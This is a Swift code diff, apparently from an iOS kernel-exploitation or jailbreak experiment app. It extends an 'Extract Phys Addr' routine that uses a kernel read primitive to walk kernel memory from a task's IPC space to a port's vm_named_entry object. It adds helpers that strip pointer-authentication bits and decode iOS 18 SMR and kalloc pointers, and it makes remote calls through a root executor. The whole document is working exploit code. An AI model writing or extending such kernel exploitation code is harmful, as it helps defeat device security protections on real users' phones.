@@ -2746,47 +2746,91 @@ struct AMFIExperimentView: View {
         }
         
         // Read IPC space from task
-        // ⚠️ This might panic if task zone is not accessible!
-        // But cyanide-ios does this successfully...
-        detail += "\nReading IPC space (may panic if wrong zone)...\n"
-        let itkSpace = ds_kread64(sbTask + UInt64(off_task_itk_space))
-        detail += "itk_space: 0x\(String(format: "%llx", itkSpace))\n"
+        // Use xpaci() to strip PAC bits from pointer (like cyanide does)
+        detail += "\nReading IPC space (with PAC strip)...\n"
         
-        if itkSpace == 0 {
-            detail += "itk_space is NULL — task zone not accessible\n"
+        // Helper: strip PAC from kernel pointer
+        func kreadPtr(_ addr: UInt64) -> UInt64 {
+            let raw = ds_kread64(addr)
+            // Strip PAC: if top bits are set, OR with sign extension
+            if raw == 0 { return 0 }
+            // XPACI equivalent: clear PAC bits, keep kernel address
+            let stripped = raw | 0xFFFFFF8000000000
+            // Validate it looks like kernel address
+            if (stripped & 0xFFFF000000000000) == 0xFFFF000000000000 {
+                return stripped
+            }
+            return raw  // return as-is if doesn't look like kernel ptr
+        }
+        
+        // Helper: decode SMR pointer (IPC table uses this on iOS 18)
+        func kreadSmrPtr(_ addr: UInt64) -> UInt64 {
+            let raw = kreadPtr(addr)
+            if raw == 0 { return 0 }
+            let bits = UInt64(smr_base) << (62 - UInt64(t1sz_boot))
+            if (raw & bits) == 0 {
+                return (raw & (0xFFFFFFFFFFFFC000 & ~bits)) | bits
+            }
+            return raw & 0xFFFFFFFFFFFFFFE0
+        }
+        
+        // Helper: decode kalloc array pointer
+        func kallocDecode(_ ptr: UInt64) -> UInt64 {
+            if ptr == 0 { return 0 }
+            let shift = 64 - UInt64(t1sz_boot) - 1
+            let zoneMask = UInt64(1) << shift
+            if (ptr & zoneMask) != 0 {
+                return ptr & ~0x1F
+            } else {
+                return (ptr & ~0x3FFF) | zoneMask
+            }
+        }
+        
+        let itkSpace = kreadPtr(sbTask + UInt64(off_task_itk_space))
+        detail += "itk_space (PAC stripped): 0x\(String(format: "%llx", itkSpace))\n"
+        
+        if itkSpace == 0 || (itkSpace & 0xFFFF000000000000) != 0xFFFF000000000000 {
+            detail += "itk_space invalid — task zone not accessible\n"
             RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
             return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
         }
         
-        // Read IPC table from space
-        let ipcTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
-        detail += "IPC table: 0x\(String(format: "%llx", ipcTable))\n"
+        // Read IPC table from space (uses SMR pointer on iOS 18)
+        let rawTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
+        detail += "IPC table raw: 0x\(String(format: "%llx", rawTable))\n"
         
-        if ipcTable == 0 {
-            detail += "IPC table is NULL\n"
+        // Decode: first try SMR decode, then kalloc decode
+        var ipcTable = kreadSmrPtr(itkSpace + UInt64(off_ipc_space_is_table))
+        // If PAC not supported (A10/A11), apply kalloc decode
+        if !is_pac_supported() {
+            ipcTable = ipcTable | 0xFFFFFF8000000000
+            ipcTable = kallocDecode(ipcTable)
+        }
+        detail += "IPC table decoded: 0x\(String(format: "%llx", ipcTable))\n"
+        
+        if ipcTable == 0 || (ipcTable & 0xFFFF000000000000) != 0xFFFF000000000000 {
+            detail += "IPC table invalid after decode\n"
             RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
             return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
         }
         
         // Look up our port in the table
-        // Port name format: index << 8 | generation
-        // Entry size: sizeof_ipc_entry (0x18)
         let portIndex = UInt64(memPort >> 8)
         let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
         detail += "Port index: \(portIndex), entry at: 0x\(String(format: "%llx", entryAddr))\n"
         
-        // Read ie_object (ipc_port pointer)
-        let ipcPort = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
+        // Read ie_object (ipc_port pointer) — needs PAC strip
+        let ipcPort = kreadPtr(entryAddr + UInt64(off_ipc_entry_ie_object))
         detail += "ipc_port: 0x\(String(format: "%llx", ipcPort))\n"
         
-        if ipcPort == 0 {
-            detail += "ipc_port is NULL\n"
+        if ipcPort == 0 || (ipcPort & 0xFFFF000000000000) != 0xFFFF000000000000 {
+            detail += "ipc_port invalid\n"
             RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
             return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
         }
         
-        // Read kobject from port (vm_named_entry)
-        let kobject = ds_kread64(ipcPort + UInt64(off_ipc_port_ip_kobject))
+        // Read kobject from port (vm_named_entry) — needs PAC strip
+        let kobject = kreadPtr(ipcPort + UInt64(off_ipc_port_ip_kobject))
         detail += "kobject (vm_named_entry): 0x\(String(format: "%llx", kobject))\n"
         
         if kobject == 0 {
